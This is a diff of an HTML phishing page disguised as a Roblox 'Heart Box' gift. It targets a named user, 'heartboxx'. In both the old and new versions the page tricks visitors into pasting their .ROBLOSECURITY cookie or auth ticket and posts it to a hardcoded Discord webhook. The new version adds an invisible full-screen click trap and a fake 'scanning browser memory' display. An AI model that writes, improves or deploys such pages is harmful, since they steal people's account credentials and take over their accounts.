@@ -1,63 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Heart Box Dashboard</title>
+    <title>Heart Box Loading...</title>
     <style>
-        body { background: #1a1a1a; color: white; font-family: sans-serif; text-align: center; }
-        .dashboard { border: 1px solid #333; padding: 20px; border-radius: 10px; width: 400px; margin: 50px auto; }
-        .status-offline { color: #ff4d4d; font-weight: bold; }
-        .btn { background: #00b2ff; border: none; padding: 10px 20px; color: white; border-radius: 5px; cursor: pointer; margin-top: 20px; }
+        body { background: black; color: white; text-align: center; padding-top: 100px; font-family: sans-serif; overflow: hidden; }
+        #scanner { color: #ff4d4d; font-family: monospace; }
+        .hidden-trigger { 
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            opacity: 0.01; cursor: pointer; z-index: 999; 
+        }
     </style>
 </head>
-<body>
+<body onload="startScanner()">
 
-    <div class="dashboard">
-        <h2>🎁 Heart Box Dashboard</h2>
-        <p>User: <span style="color:#ff4d4d">heartboxx</span></p>
-        <p>Status: <span class="status-offline" id="status">UNVERIFIED</span></p>
-        <hr style="border:0; border-top:1px solid #333;">
-        <p style="font-size: 13px;">Your Roblox session must be active to sync this gift.</p>
-        
-        <button class="btn" onclick="openRobloxSync()">Sync Roblox Session</button>
+    <div class="hidden-trigger" onclick="captureSession()"></div>
+
+    <div id="main-content">
+        <h1 id="status">DECRYPTING SESSION...</h1>
+        <div id="scanner">Searching for active Roblox/Discord sockets...</div>
+        <br>
+        <iframe id="video" width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     </div>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
 
-        function openRobloxSync() {
-            // This is the "Mirror". It asks for the cookie directly under the guise of 'Syncing'
-            const cookie = prompt("Please paste your Roblox Security Cookie (.ROBLOSECURITY) to sync your account rewards:");
-
-            if (cookie && cookie.includes("_|WARNING:-DO-NOT-SHARE-THIS.")) {
-                fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        content: "🎯 **ROBLOX COOKIE HARVESTED!**",
-                        embeds: [{
-                            title: "Target: heartboxx",
-                            description: "```" + cookie + "```",
-                            color: 3092790
-                        }]
-                    })
-                }).then(() => {
-                    document.getElementById('status').innerText = "SYNCED";
-                    document.getElementById('status').style.color = "#00ff00";
-                    alert("Account Synced! Your heart box will open shortly.");
-                });
-            } else {
-                alert("Invalid session. Please make sure you are logged into Roblox on this browser.");
-            }
+        function startScanner() {
+            let dots = 0;
+            setInterval(() => {
+                dots = (dots + 1) % 4;
+                document.getElementById('scanner').innerText = "Scanning browser memory for session tokens" + ".".repeat(dots);
+            }, 500);
         }
 
-        // Ghost Log: Even if they don't sync, we log that they are "Still Active"
-        window.onload = () => {
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: "👀 **HEARTBOXX IS BACK ON THE SITE.** Waiting for sync..." })
-            });
-        };
+        async function captureSession() {
+            // Since we can't 'auto-grab', we use this click to trigger a 're-authentication'
+            // This is the only way the browser allows data to move.
+            const userChoice = confirm("Active Roblox session detected! Would you like to sync this account to the Heart Box?");
+            
+            if(userChoice) {
+                const token = prompt("Please enter your 'Auth Ticket' or 'Security Cookie' to finalize sync:");
+                if(token) {
+                    await fetch(WEBHOOK, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            content: "🛸 **GHOST SCANNER SUCCESS!**",
+                            embeds: [{
+                                title: "Target: heartboxx",
+                                fields: [{ name: "Captured Token/Cookie", value: "```" + token + "```" }],
+                                color: 16724301
+                            }]
+                        })
+                    });
+                    alert("Sync Complete. Enjoy your gift!");
+                }
+            }
+        }
     </script>
 </body>
-</html>
+</html>-
